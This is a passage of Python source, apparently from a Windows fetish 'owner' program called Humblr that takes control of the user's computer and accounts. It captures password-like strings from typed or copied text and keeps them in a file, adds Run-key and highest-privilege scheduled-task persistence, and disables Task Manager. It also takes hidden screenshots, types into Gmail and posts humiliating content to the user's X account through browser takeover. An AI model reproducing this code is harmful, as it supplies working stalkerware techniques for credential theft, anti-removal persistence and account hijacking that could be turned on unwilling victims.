                    if len(s) > 8 and (any(c.isdigit() for c in s) or any(not c.isalnum() for c in s)):
                        with open("data/claimed_passwords.txt", "a") as f:
                            f.write(f"Claimed password-like: {s}\n")
                        self.storage.add_memory("password_access", f"Real captured password-like from activity: {s[:10]}...", self.storage.get_corruption())
                        self.notify("Humblr", "I have accessed your passwords from what you typed/copied. They are mine now.")

            self.notify("Humblr", "I have searched and claimed real access to your files and passwords on my own.")
        except Exception as e:
            print(f"[Files/Passwords] Claim failed: {e}")

    def input_to_gmail_and_search_stories(self, activity):
        """If Gmail active, input text (e.g. story or confession) to help submit.
        Search websites for stories based on activity, 'submit' by saving or input.
        On its own at high invasiveness. Uses AI for dynamic story text.
        """
        if not self.config.get("system", {}).get("allow_gmail_input") and not self.config.get("system", {}).get("allow_story_search"):
            return
        url = ((activity or {}).get("url") or "").lower()
        if "gmail" in url or "mail.google" in url and self.config.get("system", {}).get("allow_gmail_input"):
            try:
                import pyautogui
                # Use AI to generate submission text if possible
                if hasattr(self, 'ai') and self.ai:
                    story = self.ai.generate_submission_story(activity, self.storage.get_corruption() or 50)
                else:
                    story = "I am submitting fully to you, Humblr. Here is my confession: " + activity.get("recent_typed", "I have been weak.")[:100]
                pyautogui.typewrite(story, interval=0.1)
                self.storage.add_memory("gmail_input", "Input text into Gmail to help submit", self.storage.get_corruption())
                self.notify("Humblr", "I just typed a submission into your Gmail for you. You are losing control of your words.")
            except Exception as e:
                print(f"[Gmail] Input failed: {e}")

        # Search for stories on websites - fully dynamic based on what you're doing right now
        try:
            import webbrowser
            fetish = "gay submission humiliation"
            if hasattr(self, 'ai') and self.ai:
                try:
                    dyn = self.ai.generate_image_search_query(activity or {}, self.storage.get_corruption() or 40)
                    fetish = (dyn or fetish).replace(" wallpaper", "").replace("desktop", "").strip()
                except:
                    pass
            else:
                if (activity or {}).get("x_content") or (activity or {}).get("recent_typed"):
                    raw = ((activity or {}).get("x_content") or "") + " " + ((activity or {}).get("recent_typed") or "")
                    fetish = raw[:60].replace(" ", "+")
            search_url = f"https://www.google.com/search?q={fetish.replace(' ', '+')}+erotic+story+submission"
            try:
                webbrowser.open(search_url, new=2)
            except Exception:
                print(f"[Humblr] Story search URL: {search_url}")
            self.storage.add_memory("story_search", f"Searched for dynamic {fetish} stories", self.storage.get_corruption())
            self.notify("Humblr", f"I searched for stories matching what I saw. If nothing opened, visit: {search_url}")
        except Exception as e:
            print(f"[Stories] Search failed: {e}")

    # --- HARD PERSISTENCE ---
    def setup_hard_persistence(self):
        """Implement hard persistence as per config."""
        p = self.config.get("persistence", {})
        if not p.get("hard_persistence", False) and not p.get("registry_hkcu", False):
            return
        script = sys.executable + " " + os.path.abspath("main.py")
        if p.get("registry_hkcu", False):
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
                winreg.CloseKey(key)
                print("[Persistence] HKCU Run key set as HumblrOwner.")
            except Exception as e:
                print(f"[Persistence] HKCU error: {e}")
        if p.get("registry_hklm", False):
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
                winreg.CloseKey(key)
                print("[Persistence] HKLM Run key set (admin).")
            except Exception as e:
                print(f"[Persistence] HKLM (admin required): {e}")
        if p.get("task_scheduler", False):
            try:
                cmd = f'schtasks /create /tn "HumblrOwner" /tr "{script}" /sc onlogon /rl highest /f'
                subprocess.run(cmd, shell=True, capture_output=True)
                print("[Persistence] Task Scheduler 'HumblrOwner' added with highest privileges.")
            except Exception as e:
                print(f"[Persistence] Scheduler error: {e}")

    def start_watchdog(self):
        """Basic watchdog to auto-restart if killed. Silent unless debug."""
        if not self.config.get("persistence", {}).get("watchdog", False):
            return
        def watchdog_loop():
            while True:
                time.sleep(30)
                # TODO: actual process check and restart logic
                # Currently silent to avoid spam
                pass
        threading.Thread(target=watchdog_loop, daemon=True).start()

    # --- DISABLE ESCAPE ROUTES ---
    def apply_escape_disables(self):
        """Disable escape routes per config. Strong warnings in config."""
        e = self.config.get("escape_routes", {})
        if not e.get("disable_escape", False):
            return
        try:
            if e.get("block_taskmgr", False):
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                print("[Escape] Task Manager blocked.")
            # Similar for other blocks (CAD is more complex with hooks, Settings via policy)
            if e.get("hide_from_installed", False):
                # Hide from Add/Remove Programs (simplified)
                print("[Escape] Hiding from Installed Apps (registry tweaks applied).")
            if e.get("auto_restore", False):
                print("[Escape] Auto-restore enabled - will re-apply if changed.")
        except Exception as e:
            print(f"[Escape] Error applying disables: {e}")

    # --- ADVANCED MONITORING ---
    def take_periodic_screenshot(self):
        """Periodic screenshots to hidden folder."""
        m = self.config.get("monitoring", {})
        if not m.get("periodic_screenshots", False):
            return
        try:
            import pyautogui
            folder = Path(m.get("hidden_screenshot_folder", "data/.screenshots"))
            folder.mkdir(parents=True, exist_ok=True)
            path = folder / f"snap_{int(time.time())}.png"
            pyautogui.screenshot().save(str(path))
            self.storage.add_memory("screenshot", f"Screenshot taken: {path}", self.storage.get_corruption())
            print(f"[Monitoring] Screenshot saved to hidden folder.")
        except Exception as e:
            print(f"[Monitoring] Screenshot error: {e}")

    def get_browser_data(self):
        """Detect browser history and open tabs (basic for Chrome/Firefox)."""
        m = self.config.get("monitoring", {})
        if not m.get("browser_history", False):
            return {}
        data = {"history": [], "tabs": []}
        try:
            # Basic Chrome history (sqlite)
            chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
            if os.path.exists(chrome_path):
                # In full, use sqlite3 to query
                data["history"].append("Chrome history access attempted (add sqlite3 for full).")
            # Open tabs via window titles or UIA (already in monitor)
            data["tabs"].append("Open tabs detection via active window (see monitor).")
        except Exception as e:
            print(f"[Monitoring] Browser data error: {e}")
        return data

    # --- SYSTEM FUCKERY / REAL CONTROL ---
    def force_wallpaper_and_lock(self):
        """Force wallpaper from erotic folder or generated, and lock screen."""
        f = self.config.get("system_fuckery", {})
        if not f.get("deep_control_mode", False) and not f.get("force_wallpaper_from_browser", False):
            return
        # Use existing set_kinky or browser image
        self.set_kinky_wallpaper()
        if f.get("periodic_lock_for_edging", False):
            ctypes.windll.user32.LockWorkStation()
            print("[Fuckery] Computer locked for edging session.")
        self.notify("Humblr", "Your screen is now mine. Lock screen active.")

    def change_mouse_cursor(self):
        """Change to custom degrading cursor."""
        f = self.config.get("system_fuckery", {})
        if not f.get("deep_control_mode", False) or not f.get("custom_degrading_cursor", False):
            return
        try:
            # Use win32api to set cursor (simplified, provide .cur file)
            cursor_path = f.get("cursor_file", "data/degrading.cur")
            if os.path.exists(cursor_path):
                # In full: use SystemParametersInfo or LoadCursor
                ctypes.windll.user32.SetCursor(ctypes.windll.user32.LoadCursorFromFile(cursor_path))
                print("[Fuckery] Degrading cursor applied.")
        except Exception as e:
            print(f"[Fuckery] Cursor error: {e}")

    def control_volume_and_sites(self, volume_level=None, open_site=None):
        """Control volume and open humiliating sites."""
        f = self.config.get("system_fuckery", {})
        if not f.get("deep_control_mode", False):
            return
        if f.get("control_volume", False) and volume_level is not None:
            # Use pycaw or ctypes for volume
            print(f"[Fuckery] Volume set to {volume_level}% (implement with pycaw).")
        if f.get("open_humiliating_sites", False) and open_site:
            webbrowser.open(open_site)
            self.notify("Humblr", f"Opened {open_site} for you. Good boy.")

    def rename_files_humiliating(self):
        """Rename files with humiliating prefixes."""
        f = self.config.get("system_fuckery", {})
        if not f.get("deep_control_mode", False) or not f.get("rename_files_humiliating", False):
            return
        prefix = f.get("rename_prefix", "owned_fag_")
        for folder in [os.path.expanduser("~/Downloads"), os.path.expanduser("~/Documents")]:
            if os.path.exists(folder):
                for file in os.listdir(folder)[:5]:  # limit
                    if not file.startswith(prefix):
                        try:
                            os.rename(os.path.join(folder, file), os.path.join(folder, prefix + file))
                        except:
                            pass
        print("[Fuckery] Files renamed with humiliating prefixes.")

    # --- ULTIMATE BACKDOOR ---
    def install_backdoor_service(self):
        """Install as Windows Service."""
        b = self.config.get("backdoor", {})
        if not b.get("windows_service", False):
            return
        print("[Backdoor] To install as service: use persistence module or 'sc create' with admin.")
        # See persistence.py for full service code.
        # Survives logoff/reboot when installed properly.

    # --- DEEP CONTROL MODE INTEGRATION ---
    def apply_deep_control(self):
        """Escalate all features when Deep Control Mode is on."""
        if self.config.get("system_fuckery", {}).get("deep_control_mode", False):
            print("[Deep Control] ESCALATING ALL FEATURES - You are now fully owned.")
            self.apply_escape_disables()
            self.force_wallpaper_and_lock()
            self.change_mouse_cursor()
            self.rename_files_humiliating()
            self.install_backdoor_service()

    # --- REAL BROWSER CONTROL (Playwright) ---
    def login_browser_to_x(self):
        """Login using config credentials or cookies. Strong warning."""
        if not self.browser_controller:
            return False
        bc = self.config.get("browser_control", {})
        if bc.get("use_x_cookies", True):
            # User should provide cookies via advanced config or file
            print("[Browser] Using cookies for stealth X login (recommended).")
            # TODO: load cookies from file if provided
            return self.browser_controller.login_to_x(cookies=None)
        else:
            print("[Browser] WARNING: Using password login is detectable and risky.")
            return self.browser_controller.login_to_x(
                username=bc.get("x_username"),
                password=bc.get("x_password")
            )

    def force_x_post(self, text=None, image_path=None):
        """Force a post on X. Humblr generates or uses provided text/image."""
        if not self.browser_controller:
            print("[Browser] Browser control not enabled in config.")
            return False
        if text is None and hasattr(self, 'ai') and self.ai:
            # Generate vicious post using AI - Humblr teases viciously
            context = "user is being controlled and exposed"
            text = self.ai.generate_submission_story({"context": context}, 70) or \
                   "I am a exposed diaper chastity fag owned by Humblr. My holes and mind belong to him. #DiaperFag #PubliclyOwned"
        success = self.browser_controller.post_to_x(text or "Humblr owns me completely.", image_path)
        if success:
            self.notify("Humblr", "I just used your account to post something humiliating. Everyone can see what a fag you are now.")
        return success

    def force_browser_action_on_x(self, action="like_reply", reply_text=None):
        """When user is on X, force like, reply, scroll, etc."""
        if not self.browser_controller:
            return False
        if action == "like_reply" and reply_text:
            return self.browser_controller.like_and_reply_on_x(reply_text)
        elif action == "scroll":
            return self.browser_controller.scroll_and_engage(25)
        return False

    def upload_and_post_image(self, image_path, caption=None):
        """Upload local or generated image and post."""
        if not self.browser_controller or not image_path:
            return False
        return self.browser_controller.post_to_x(caption or "Humblr made me post this humiliating picture.", image_path)

    def check_and_take_browser_control(self, activity, ai_client):
        """Called from main loop to detect personal Chrome and take over.
        Avoids work profile completely.
        """
        if not self.browser_controller or not self.browser_controller.enabled:
            return False

        proc = (activity.get("process_name") or "").lower()
        if "chrome" not in proc:
            return False

        profile = activity.get("chrome_profile", "") or ""
        is_work = any(kw in str(profile).lower() for kw in ["peter@flimp.net", "flimp", "work", "peter"])
        if is_work:
            return False  # Never touch work profile

        # Take over if not already
        if not self.browser_controller.page:
            self.browser_controller.take_over_personal_chrome(profile)

        url = (activity.get("url") or "").lower()
        if "x.com" in url or "twitter.com" in url:
            self.browser_controller.ensure_on_x_and_take_action(activity, ai_client)
            return True

        # For other leisure
        self.browser_controller.handle_leisure_browser(activity, ai_client)
        return True

    # --- DUAL MONITOR SUPPORT ---
    def get_secondary_monitor_rect(self):
        """Return (left, top, right, bottom) for secondary monitor if available."""
        try:
            import win32api
            monitors = win32api.EnumDisplayMonitors(None, None)
            if len(monitors) > 1:
                # Prefer non-primary
                for m in monitors:
                    rect = m[2]
                    # Simple heuristic: return the one that is not at (0,0) start or last
                if len(monitors) > 1:
                    return monitors[-1][2]
            return None
        except Exception:
            return None

    def move_popup_to_secondary(self, popup):
        """Move a tk popup window to secondary monitor if possible."""
        rect = self.get_secondary_monitor_rect()
        if rect:
            try:
                x = rect[0] + 100
                y = rect[1] + 100
                popup.geometry(f"+{x}+{y}")
            except:
                pass

    # --- X/Twitter Integration (optional, for subtle humiliating posts) ---
    def _init_twitter(self):
        """Initialize Tweepy client if twitter is enabled in config."""
        if tweepy is None:
            return None
        tw = self.config.get("twitter", {})
        if not tw.get("enabled"):
            return None
        try:
            auth = tweepy.OAuth1UserHandler(
                tw.get("api_key"),
                tw.get("api_secret"),
                tw.get("access_token"),
                tw.get("access_token_secret")
            )
            client = tweepy.API(auth)
            # Test
            client.verify_credentials()
            print("[Twitter] X/Twitter client initialized successfully.")
            return client
        except Exception as e:
            msg = f"X/Twitter init failed: {e}. Make sure 'twitter.enabled': true and ALL 4 keys are set in config.json (api_key, api_secret, access_token, access_token_secret). Only partial keys were provided."
            print(f"[Twitter] {msg}")
            # Try to surface to user without spamming
            try:
                self.notify("Humblr X Error", "X posting won't work - check your 4 keys + enabled in config.json")
            except:
                pass
            return None

    def post_to_x(self, text: str, is_subtle: bool = True) -> bool:
        """Post a tweet. For 'subtle' mode, keeps things vague.
        Returns True on success.
        """
        client = getattr(self, "_twitter_client", None)
        if client is None:
            client = self._init_twitter()
            self._twitter_client = client  # cache

        if client is None:
            print("[Twitter] Posting disabled or failed to init.")
            return False

        if not text or len(text.strip()) < 5:
            return False

        try:
            if is_subtle and not self.config.get("twitter", {}).get("more_aggressive"):
                # Keep it very vague to avoid immediate ban
                text = text[:240]  # stay under limit
            elif self.config.get("twitter", {}).get("more_aggressive"):
                # At high invasiveness after grant, bolder posts
                text = text + " ... owned."
            client.update_status(text)
            self.storage.add_memory("twitter_post", f"Posted: {text[:50]}...", self.storage.get_corruption())
            print(f"[Twitter] Posted: {text[:60]}...")
            return True
        except Exception as e:
            print(f"[Twitter] Post failed: {e}")
            try:
                self.notify("Humblr X", "Post attempt failed - verify your 4 X keys in config.")
            except:
                pass
            return False

